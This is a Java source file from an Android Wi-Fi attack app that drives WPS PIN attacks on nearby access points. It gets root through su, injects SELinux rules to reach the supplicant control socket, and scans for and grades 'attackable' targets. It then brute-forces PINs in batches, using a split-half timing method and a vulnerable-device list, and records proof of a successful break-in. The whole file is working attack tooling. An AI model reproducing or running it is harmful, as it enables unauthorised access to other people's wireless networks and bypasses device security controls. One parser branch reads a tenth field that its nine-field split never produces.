package io.github.wlmosv_png.wpaforge.wps;

import java.io.BufferedReader;
import java.io.InputStreamReader;
import java.util.ArrayList;
import java.util.List;

/**
 * WPS 攻击的 App 侧控制器。
 *
 * 执行链：App → {@code su -c "CLASSPATH=<apk> app_process ... WpsHelper <cmd>"}
 * → supplicant 控制接口。helper 的类就在本 APK 的 dex 里，不需要额外资源文件。
 *
 * 为什么必须走 root：supplicant 的控制 socket 属主是 wifi:wifi(0770)，
 * 且 SELinux 只放行特定域，普通应用进程两者都过不去。
 */
public final class WpsController {

    private static final String HELPER = "io.github.wlmosv_png.wpaforge.wps.WpsHelper";

    private WpsController() {
    }

    /** 一次尝试的结果。 */
    public static final class Result {
        public String pin = "";
        /**
         * SUCCESS / SUCCESS_UNVERIFIED / REJECTED / PIN_REJECTED / NO_ASSOC /
         * NO_RESPONSE / HALF_OK / CMD_FAIL / LINK_LOST / TIMEOUT / SKIPPED_INVALID / ERROR
         *
         * <p>SUCCESS = 协议确认且目标归属成立（可判命中）；
         * SUCCESS_UNVERIFIED = 状态像成功但证据不足（只能记疑似）。
         */
        public String status = "ERROR";
        public long elapsedMs;
        public int assocCount;
        public long maxAssocMs;
        /** AP 是否真跟我们建立了 WPS 会话（出现过 km=WPS 的关联） */
        public boolean wpsSession;
        /**
         * supplicant 日志指纹：NONE / EAP_ONLY / M2D_ONLY / M2D_STALL / EAP_STALL / M2D_THEN_MORE。
         * 拆半攻击靠它判断「PIN 前 4 位是否被 AP 接受」。
         */
        public String logKind = "";
        /** 从 WPS-M2D 到本轮结束的毫秒数（-1 = 没看到 M2D）—— 拆半的时序判据 */
        public long m2dToEndMs = -1;
        /** 本轮结束时 AP 是否 WPS 锁定：1=已锁 0=未锁 -1=没查到 */
        public int apLocked = -1;
        public String raw = "";

        public boolean isSuccess() {
            return "SUCCESS".equals(status);
        }

        /** 状态像成功，但证据不足以判命中（不得渲染成「已命中」）。 */
        public boolean isUnverified() {
            return "SUCCESS_UNVERIFIED".equals(status);
        }

        /** 本次尝试是否产生了任何命中证据（用于 UI 与记账）。 */
        public boolean hasHitEvidence() {
            return !hitVerdict.isEmpty();
        }

        // ---------------- 命中证据（与状态同源，一次尝试一份） ----------------

        /** HIT_CONFIRMED / HIT_UNVERIFIED / NOT_TARGET / NO_HIT。 */
        public String hitVerdict = "";
        /** 为什么是这个结论（{@link WpsHitJudge#why}）。 */
        public String hitWhy = "";
        /** 可确认的事实位：PROTOCOL / CREDENTIAL / STORED / ONLINE，逗号分隔。 */
        public String hitFacts = "";
        /** 命中时的目标 SSID（我们发出去的参照物）。 */
        public String targetSsid = "";
        /** 命中时 supplicant 报的「当前连着的」SSID / BSSID / IP。 */
        public String hitSsid = "";
        public String hitBssid = "";
        public String hitIp = "";
        /** 600ms 复核：1 仍在线 / 0 已掉 / -1 没取到。 */
        public int hitConfirm = -1;
        /** 本次是否与**目标**做过 km=WPS 的关联（归属判据的一半）。 */
        public boolean sawTargetWpsSession;
        /** 命中帧的 netId 与基线 netId。 */
        public int hitNetId = -1;
        public int baseNetId = -1;
        /** 当前是否真的联网（IP 有效）—— 独立事实，不参与命中结论。 */
        public boolean online() {
            return WpsHitJudge.hasValidIp(hitIp);
        }

        /** AP 是否在跟我们做 WPS —— 命中与否都算，这是「可攻击」的判据。 */
        public boolean apIsTalking() {
            return wpsSession || "REJECTED".equals(status)
                    || "PIN_REJECTED".equals(status) || "HALF_OK".equals(status);
        }

        /**
         * 拆半阶段 1 的判据：PIN 的前 4 位被 AP 接受了。
         * 表现是「M2D 之后 AP 还回了消息」—— 正常错 PIN 会一直静默到超时。
         */
        public boolean halfPrefixAccepted() {
            return "HALF_OK".equals(status) || "M2D_THEN_MORE".equals(logKind);
        }

        /** 结果 → 人话（双语）。 */
        public String label(boolean zh) {
            switch (status) {
                case "SUCCESS":
                    return zh ? "命中" : "HIT";
                case "SUCCESS_UNVERIFIED":
                    return zh ? "疑似命中（证据不足）" : "SUSPECT (weak evidence)";
                case "PIN_REJECTED":
                    // 修复前这条没有 case，原样打印 "PIN_REJECTED" —— 用户在日志里
                    // 看到英文内部码，会以为程序出错了。
                    return zh ? "PIN 被拒（AP 在做 WPS）" : "PIN rejected (AP is doing WPS)";
                case "HALF_OK":
                    return zh ? "前 4 位被接受" : "first half accepted";
                case "SKIPPED_INVALID":
                    return zh ? "跳过（校验位不合法）" : "skipped (bad checksum)";
                case "REJECTED":
                    return zh ? "PIN 被拒（AP 在做 WPS）" : "PIN rejected (AP is doing WPS)";
                case "NO_ASSOC":
                    return zh ? "关联被拒" : "assoc rejected";
                case "NO_RESPONSE":
                    return zh ? "无响应（未进配对）" : "no response (not pairing)";
                case "CMD_FAIL":
                    return zh ? "命令被 supplicant 拒绝" : "command refused by supplicant";
                case "LINK_LOST":
                    return zh ? "控制接口断开（已自动退出本轮）" : "control interface lost";
                case "TIMEOUT":
                    return zh ? "超时" : "timeout";
                case "ERROR":
                    return zh ? "错误" : "error";
                default:
                    return status;
            }
        }
    }

    /** 扫描到的 WPS 目标。 */
    public static final class Target {
        public String bssid = "";
        public String ssid = "";
        public int rssi;
        public int freq;
        /** PIN_OK / NO_PIN / LOCKED / UNKNOWN —— 来自 AP 自己宣告的 WSC 配置方法 */
        public String wpsVerdict = "UNKNOWN";
        /** 原始 wps_config_methods，例如 0x2008 */
        public String wpsMethods = "";
        /** AP 自报的设备名，便于用户辨认（如 fiberhome ONT） */
        public String wpsDevice = "";
        /** Selected Registrar：1 = AP 正处于配对待机（现在打才有意义），0 = 没开，-1 = 未知 */
        public int pairingWindow = -1;
        /** Device Password ID：4 = PushButton，0 = Default，1 = User-specified，-1 = 未知 */
        public int devPwdId = -1;
        /** 扫描时是否从 supplicant BSS 表读到过这个 AP（true=读到但 WPS 段缺失/未知；false=BSS 都没查到）。 */
        public boolean haveBss;

        /** 体检结论："" 未体检 / HIT / READY / INSTANT / NOWPS / LOCKED */
        public String recon = "";
        /** 体检细节（关联毫秒 + 日志指纹），列表上一起显示 */
        public String reconDetail = "";

        /** 已知可打（Pixie）名单的命中结果；null = 未命中，或设备名还没读到 */
        public VulnWsc.Match vuln;

        /** 命中名单的短标记（列表胶囊用）；没命中返回空串 */
        public String vulnShort(boolean zh) {
            return VulnUi.shortLabel(vuln, zh);
        }

        /** 体检结论 → 人话。READY 才是「值得开打」的目标。 */
        public String reconLabel(boolean zh) {
            switch (recon == null ? "" : recon) {
                case "HIT":
                    return zh ? "★ 直接命中" : "★ HIT";
                case "READY":
                    return zh ? "✓ 可破（真做 WPS）" : "✓ attackable (real WPS)";
                case "INSTANT":
                    return zh ? "✗ 关联即断（没在等配对）" : "✗ instant disconnect";
                case "NOWPS":
                    return zh ? "✗ 不响应 WPS" : "✗ no WPS response";
                case "LOCKED":
                    return zh ? "✗ 已锁定" : "✗ locked";
                case "MAYBE":
                    return zh ? "△ 关联够长，但没看到 WPS 交换（需再确认）"
                              : "△ long assoc but no WPS exchange seen";
                case "SKIP":
                    return zh ? "— 跳过（声明不收外部 PIN）" : "— skipped (no external PIN)";
                case "WEAK":
                    return zh ? "△ WPS 有响应，但关联采不到（多半已被试退）"
                              : "△ WPS responds but assoc unmeasurable (likely worn down)";
                default:
                    return "";
            }
        }

        /** 是否值得开打（只有体检确认过的才算）。 */
        public boolean reconReady() {
            return "READY".equals(recon) || "HIT".equals(recon);
        }

        /** 体检结论是否可能是"偶发"（需再测一次确认）。 */
        public boolean reconUnsure() {
            return "MAYBE".equals(recon) || "WEAK".equals(recon);
        }

        /** 该 AP 是否值得跑 PIN。UNKNOWN 表示没查到（不阻断，靠运行时兜底）。 */
        public boolean pinWorthTrying() {
            return !"NO_PIN".equals(wpsVerdict) && !"LOCKED".equals(wpsVerdict);
        }

        public String capLabel(boolean zh) {
            StringBuilder sb = new StringBuilder();
            switch (wpsVerdict) {
                case "PIN_OK":
                    sb.append(zh ? "PIN 可打" : "PIN OK");
                    break;
                case "NO_PIN":
                    sb.append(zh ? "不收外部 PIN" : "No external PIN");
                    break;
                case "LOCKED":
                    sb.append(zh ? "AP 已锁定" : "AP locked");
                    break;
                default:
                    sb.append(zh ? "能力未知" : "Unknown");
                    break;
            }
            // 「有能力」不等于「现在肯收」：配对窗口没开的话，发 PIN 出去也会被秒断
            if (pairingWindow == 1) {
                sb.append(zh ? " · 配对窗口已开" : " · pairing window OPEN");
            } else if (pairingWindow == 0) {
                sb.append(zh ? " · 配对窗口未开" : " · pairing window closed");
            }
            if (devPwdId == 4) sb.append(zh ? " · 按键模式" : " · PushButton mode");
            return sb.toString();
        }

        public String describe() {
            return ssid + "  " + bssid + "  " + rssi + "dBm";
        }
    }

    /** supplicant / 连接状态快照。 */
    public static final class Status {
        public String ssid = "";
        public String bssid = "";
        public String state = "";
        public String keyMgmt = "";
        public String netId = "";
        public String ip = "";
        public boolean ok;

        public boolean connected() {
            return "COMPLETED".equals(state);
        }
    }

    /** 进度回调。 */
    public interface Listener {
        void onLine(String line);

        void onResult(Result r);

        /** 返回 true 表示请求中止。 */
        boolean isCancelled();
    }

    // ---------------- 基础能力 ----------------

    /** root 是否可用（能读到 supplicant 状态即视为可用）。 */
    public static boolean available(android.content.Context ctx) {
        return status(ctx).ok;
    }

    /** 注入 SELinux 规则（幂等）。 */
    public static void injectSelinux(android.content.Context ctx) {
        run(ctx, 20, null, "selinux");
    }

    /** 按住/放开 framework 的自动重连。 */
    public static void setAutojoin(android.content.Context ctx, boolean enable) {
        run(ctx, 20, null, "autojoin", enable ? "on" : "off");
    }

    /** 当前连接状态（结构化）。 */
    public static Status status(android.content.Context ctx) {
        Status st = new Status();
        String out = run(ctx, 20, null, "status");
        for (String line : out.split("\n")) {
            line = line.trim();
            int i = line.indexOf('=');
            if (i <= 0) continue;
            String k = line.substring(0, i);
            String v = line.substring(i + 1);
            switch (k) {
                case "SSID": st.ssid = v; break;
                case "BSSID": st.bssid = v; break;
                case "STATE": st.state = v; break;
                case "KEYMGMT": st.keyMgmt = v; break;
                case "NETID": st.netId = v; break;
                case "IP": st.ip = v; break;
                case "STATUS_OK": st.ok = "1".equals(v); break;
                default: break;
            }
        }
        return st;
    }

    /**
     * 扫描周边，返回支持 WPS 的 AP。
     * 每个目标都附带 AP 自己宣告的 WPS 能力（能否收 PIN / 是否被锁），
     * 这样用户在列表阶段就能筛掉必然打不动的目标，不用等跑完一轮才知道。
     */
    public static List<Target> scan(android.content.Context ctx) {
        return scan(ctx, null);
    }

    /**
     * 扫描目标。传 listener 可以拿到流式输出（helper 会边扫边发
     * PHASE= / PROGRESS= / AP= 行），界面就能实时显示进度和目标，
     * 而不是干等三十秒然后一次性蹦出来。
     */
    public static List<Target> scan(android.content.Context ctx, Listener listener) {
        List<Target> out = new ArrayList<>();
        String raw = run(ctx, 240, listener, "scan");
        for (String line : raw.split("\n")) {
            line = line.trim();
            if (!line.startsWith("AP=")) continue;
            Target t = parseApLine(line);
            if (t != null) out.add(t);
        }
        return out;
    }

    /** 解析 helper 的 AP= 行（流式渲染与一次性解析共用同一套规则）。 */
    public static Target parseApLine(String line) {
        String[] p = line.substring(3).split("\\|", 9);
        if (p.length < 4) return null;
        Target t = new Target();
        t.bssid = p[0];
        t.ssid = p[1];
        t.rssi = parseInt(p[2], 0);
        t.freq = parseInt(p[3], 0);
        if (p.length >= 5) t.wpsVerdict = p[4].isEmpty() ? "UNKNOWN" : p[4];
        if (p.length >= 6) t.wpsMethods = p[5];
        if (p.length >= 7) t.wpsDevice = p[6];
        if (p.length >= 8) t.pairingWindow = parseInt(p[7], -1);
        if (p.length >= 9) t.devPwdId = parseInt(p[8], -1);
        // 第 10 段（2026-11-08 扫描修复）：supplicant BSS 表是否真读到过这个 AP。
        if (p.length >= 10) t.haveBss = "1".equals(p[9]);
        return t;
    }

    /** 单个 AP 的 WPS 能力画像。 */
    public static final class Info {
        public String bssid = "";
        public String ssid = "";
        public String device = "";
        public String state = "";
        public String methods = "";
        /** AP 的 IE 十六进制串（供本地 WPS IE 解析；空 = 未取到）。 */
        public String ieHex = "";
        public int mask = -1;
        public boolean pinCapable;
        public boolean pbcCapable;
        public boolean locked;
        /** Selected Registrar：1 = 正处于配对待机，0 = 未开，-1 = 未知 */
        public int pairingWindow = -1;
        /** Device Password ID：4 = PushButton */
        public int devPwdId = -1;
        /** 命令本身是否成功（BSS 表里有这个 AP 且能读出 WPS 段） */
        public boolean ok;
        /** PIN_OK / NO_PIN / LOCKED / NO_WPS */
        public String verdict = "NO_WPS";

        public boolean hopeless() {
            return "NO_PIN".equals(verdict) || "LOCKED".equals(verdict);
        }

        public String reason(boolean zh) {
            if ("LOCKED".equals(verdict)) {
                return zh ? "AP 处于 WPS 锁定状态（AP Setup Locked）" : "AP is WPS-locked";
            }
            if ("NO_PIN".equals(verdict)) {
                return zh ? "AP 未声明 PIN 输入能力（config_methods=" + methods + "）"
                          : "AP does not accept an external PIN (config_methods=" + methods + ")";
            }
            if ("NO_WPS".equals(verdict)) {
                return zh ? "读不到该 AP 的 WPS 信息" : "No WPS info available";
            }
            return zh ? "AP 声明可接受 PIN" : "AP accepts PIN";
        }
    }

    /** 查单个 AP 的 WPS 能力（BSS 表里没有则 verdict=NO_WPS，不阻塞后续）。 */
    public static Info info(android.content.Context ctx, String bssid) {
        return parseInfo(run(ctx, 20, null, "wpsinfo", bssid));
    }

    static Info parseInfo(String out) {
        Info f = new Info();
        if (out == null) return f;
        for (String line : out.split("\n")) {
            line = line.trim();
            int i = line.indexOf('=');
            if (i <= 0) continue;
            String k = line.substring(0, i);
            String v = line.substring(i + 1).trim();
            switch (k) {
                case "WPS_BSSID": f.bssid = v; break;
                case "WPS_SSID": f.ssid = v; break;
                case "WPS_DEV": f.device = v; break;
                case "WPS_STATE": f.state = v; break;
                case "WPS_METHODS": f.methods = v; break;
                case "WPS_IE": f.ieHex = v; break;
                case "WPS_PIN_CAPABLE": f.pinCapable = "1".equals(v); break;
                case "WPS_PBC_CAPABLE": f.pbcCapable = "1".equals(v); break;
                case "WPS_LOCKED": f.locked = "1".equals(v); break;
                case "WPS_SEL_REG": f.pairingWindow = parseInt(v, -1); break;
                case "WPS_DEV_PWD_ID": f.devPwdId = parseInt(v, -1); break;
                case "WPS_VERDICT": f.verdict = v; break;
                case "WPS_OK": f.ok = "1".equals(v); break;
                default: break;
            }
        }
        if (f.methods.startsWith("0x") || f.methods.startsWith("0X")) {
            try {
                f.mask = (int) Long.parseLong(f.methods.substring(2), 16);
            } catch (Throwable ignored) {
                f.mask = -1;
            }
        }
        return f;
    }

    // ---------------- 尝试 ----------------

    /** 单次 PIN 尝试。 */
    public static Result tryPin(android.content.Context ctx, String bssid, String pin, int tryTimeoutSec) {
        return tryPin(ctx, bssid, "", pin, tryTimeoutSec);
    }

    /**
     * 单次 PIN 尝试（带目标 SSID）。
     *
     * <p>SSID 参与命中归属判定：只认「连上的网络就是目标」才算命中。
     * 未知时传空串，helper 侧退化为「只用 BSSID 归属」，判不出来记疑似。
     */
    public static Result tryPin(android.content.Context ctx, String bssid, String targetSsid,
                                String pin, int tryTimeoutSec) {
        String out = run(ctx, tryTimeoutSec + 20, null, "pin", bssid, pin,
                String.valueOf(tryTimeoutSec), enc(targetSsid));
        return parseOne(out);
    }

    /**
     * 批量尝试：一次 helper 进程内跑多个 PIN，省掉反复启动 app_process 的开销。
     * 命中即返回（helper 侧会 break），剩余候选由调用方续跑。
     */
    public static List<Result> batch(android.content.Context ctx, String bssid,
                                     List<String> pins, int perTrySec, int budgetSec,
                                     Listener listener) {
        return batch(ctx, bssid, "", pins, perTrySec, budgetSec, listener);
    }

    /**
     * 批量尝试（带目标 SSID，并合并每条尝试的命中证据）。
     *
     * <p>返回的列表长度 = helper **实际处理过的**候选数，不是请求数。
     * 调用方必须按这个长度推进游标 —— 否则暂停 / 预算耗尽时，
     * 没跑到的候选会被记成「已跑过」，永远不再尝试。
     */
    public static List<Result> batch(android.content.Context ctx, String bssid, String targetSsid,
                                     List<String> pins, int perTrySec, int budgetSec,
                                     Listener listener) {
        List<Result> results = new ArrayList<>();
        if (pins == null || pins.isEmpty()) return results;

        StringBuilder sb = new StringBuilder();
        for (int i = 0; i < pins.size(); i++) {
            if (i > 0) sb.append(',');
            sb.append(pins.get(i));
        }
        String out = run(ctx, budgetSec + 40, listener,
                "batch", bssid, sb.toString(), String.valueOf(perTrySec),
                String.valueOf(budgetSec), enc(targetSsid));
        String[] lines = out.split("\n");
        for (int i = 0; i < lines.length; i++) {
            String line = lines[i].trim();
            if (!line.startsWith("PIN=") || !line.contains("RESULT=")) continue;
            Result r = parseBatchLine(line);
            // 紧跟其后的 "HIT …" 行是这条尝试的证据行（值 URL 编码）
            if (i + 1 < lines.length) {
                String next = lines[i + 1].trim();
                if (next.startsWith("HIT ")) applyEvidence(r, next);
            }
            results.add(r);
            if (listener != null) listener.onResult(r);
        }
        return results;
    }

    /** URL 编码（与 helper 侧 {@code enc} 对称）。 */
    static String enc(String v) {
        if (v == null) return "";
        try {
            return java.net.URLEncoder.encode(v, "UTF-8");
        } catch (Throwable t) {
            return "";
        }
    }

    /**
     * URL 解码；解不开时**保留原文**（宁可显示成乱码，也不要把证据丢掉）。
     */
    static String dec(String v) {
        if (v == null) return "";
        try {
            return java.net.URLDecoder.decode(v, "UTF-8");
        } catch (Throwable t) {
            return v;
        }
    }

    /**
     * 把 helper 的证据行合并进结果（纯函数，离线可测）。
     *
     * <p>格式：{@code HIT PIN=.. VERDICT=.. TSSID=.. CSSID=.. CBSSID=.. IP=.. CID=..
     * BASE=.. CONFIRM=.. SESS=.. FACTS=.. WHY=..}，值全部 URL 编码。
     */
    static void applyEvidence(Result r, String hitLine) {
        if (r == null || hitLine == null) return;
        for (String tok : hitLine.split("\\s+")) {
            int i = tok.indexOf('=');
            if (i <= 0) continue;
            String k = tok.substring(0, i);
            String v = tok.substring(i + 1);
            switch (k) {
                case "VERDICT": r.hitVerdict = dec(v); break;
                case "WHY": r.hitWhy = dec(v); break;
                case "FACTS": r.hitFacts = dec(v); break;
                case "TSSID": r.targetSsid = dec(v); break;
                case "CSSID": r.hitSsid = dec(v); break;
                case "CBSSID": r.hitBssid = dec(v); break;
                case "IP": r.hitIp = dec(v); break;
                case "CID": r.hitNetId = parseInt(v, -1); break;
                case "BASE": r.baseNetId = parseInt(v, -1); break;
                case "CONFIRM": r.hitConfirm = parseInt(v, -1); break;
                case "SESS": r.sawTargetWpsSession = "1".equals(v); break;
                default: break;
            }
        }
    }

    // ---------------- 执行 ----------------

    static String buildCommand(android.content.Context ctx, String... args) {
        StringBuilder sb = new StringBuilder();
        sb.append("CLASSPATH=").append(ctx.getPackageCodePath());
        sb.append(" app_process /system/bin ").append(HELPER);
        for (String a : args) sb.append(' ').append(a);
        return sb.toString();
    }

    static String run(android.content.Context ctx, int timeoutSec,
                      Listener listener, String... args) {
        Process p = null;
        StringBuilder all = new StringBuilder();
        try {
            String cmd = buildCommand(ctx, args);
            p = Runtime.getRuntime().exec(new String[]{"su", "-c", cmd});
            final Process fp = p;

            Thread killer = new Thread(() -> {
                try {
                    Thread.sleep(Math.max(3, timeoutSec) * 1000L);
                    fp.destroy();
                } catch (Throwable ignored) {
                }
            }, "wps-timeout");
            killer.setDaemon(true);
            killer.start();

            BufferedReader br = new BufferedReader(
                    new InputStreamReader(p.getInputStream(), "UTF-8"));
            String line;
            while ((line = br.readLine()) != null) {
                all.append(line).append('\n');
                if (listener != null) {
                    listener.onLine(line);
                    if (listener.isCancelled()) {
                        p.destroy();
                        break;
                    }
                }
            }
            br.close();
            killer.interrupt();
        } catch (Throwable t) {
            if (p != null) p.destroy();
        }
        return all.toString();
    }

    // ---------------- 解析 ----------------

    static Result parseOne(String out) {
        Result r = new Result();
        r.raw = out == null ? "" : out;
        if (out == null) {
            r.status = "ERROR";
            return r;
        }
        for (String line : out.split("\n")) {
            line = line.trim();
            if (line.startsWith("RESULT=")) {
                r.status = line.substring(7).trim();
            } else if (line.startsWith("ELAPSED_MS=")) {
                r.elapsedMs = parseLong(line.substring(11).trim());
            } else if (line.startsWith("ASSOC_COUNT=")) {
                r.assocCount = (int) parseLong(line.substring(12).trim());
            } else if (line.startsWith("MAX_ASSOC_MS=")) {
                r.maxAssocMs = parseLong(line.substring(13).trim());
            } else if (line.startsWith("PIN=")) {
                r.pin = line.substring(4).trim();
            } else if (line.startsWith("WPS_SESSION=")) {
                r.wpsSession = "1".equals(line.substring(12).trim());
            } else if (line.startsWith("LOG_KIND=")) {
                r.logKind = line.substring(9).trim();
            } else if (line.startsWith("M2D_TO_END_MS=")) {
                r.m2dToEndMs = parseLong(line.substring(14).trim());
            } else if (line.startsWith("AP_LOCKED=")) {
                r.apLocked = (int) parseLong(line.substring(10).trim());
            } else if (line.startsWith("HIT_VERDICT=")) {
                r.hitVerdict = dec(line.substring(12).trim());
            } else if (line.startsWith("HIT_WHY=")) {
                r.hitWhy = dec(line.substring(8).trim());
            } else if (line.startsWith("HIT_FACTS=")) {
                r.hitFacts = dec(line.substring(10).trim());
            } else if (line.startsWith("HIT_SSID=")) {
                r.hitSsid = dec(line.substring(9).trim());
            } else if (line.startsWith("HIT_BSSID=")) {
                r.hitBssid = dec(line.substring(10).trim());
            } else if (line.startsWith("HIT_IP=")) {
                r.hitIp = dec(line.substring(7).trim());
            } else if (line.startsWith("HIT_CONFIRM=")) {
                r.hitConfirm = parseInt(line.substring(12).trim(), -1);
            } else if (line.startsWith("HIT_NETID=")) {
                r.hitNetId = parseInt(line.substring(10).trim(), -1);
            } else if (line.startsWith("HIT_BASE_NETID=")) {
                r.baseNetId = parseInt(line.substring(15).trim(), -1);
            } else if (line.startsWith("HIT_TARGET_SSID=")) {
                r.targetSsid = dec(line.substring(16).trim());
            }
        }
        if (r.status.isEmpty()) r.status = "ERROR";
        return r;
    }

    static Result parseBatchLine(String line) {
        Result r = new Result();
        r.raw = line;
        for (String tok : line.split("\\s+")) {
            int i = tok.indexOf('=');
            if (i <= 0) continue;
            String k = tok.substring(0, i);
            String v = tok.substring(i + 1);
            switch (k) {
                case "PIN": r.pin = v; break;
                case "RESULT": r.status = v; break;
                case "ELAPSED_MS": r.elapsedMs = parseLong(v); break;
                case "ASSOC_COUNT": r.assocCount = (int) parseLong(v); break;
                case "MAX_ASSOC_MS": r.maxAssocMs = parseLong(v); break;
                case "WPS_SESSION": r.wpsSession = "1".equals(v); break;
                case "LOG_KIND": r.logKind = v; break;
                case "M2D_MS": r.m2dToEndMs = parseLong(v); break;
                case "LOCKED": r.apLocked = (int) parseLong(v); break;
                default: break;
            }
        }
        return r;
    }

    static long parseLong(String s) {
        try {
            return Long.parseLong(s.trim());
        } catch (Throwable t) {
            return 0;
        }
    }

    static int parseInt(String s, int def) {
        try {
            return Integer.parseInt(s.trim());
        } catch (Throwable t) {
            return def;
        }
    }
}
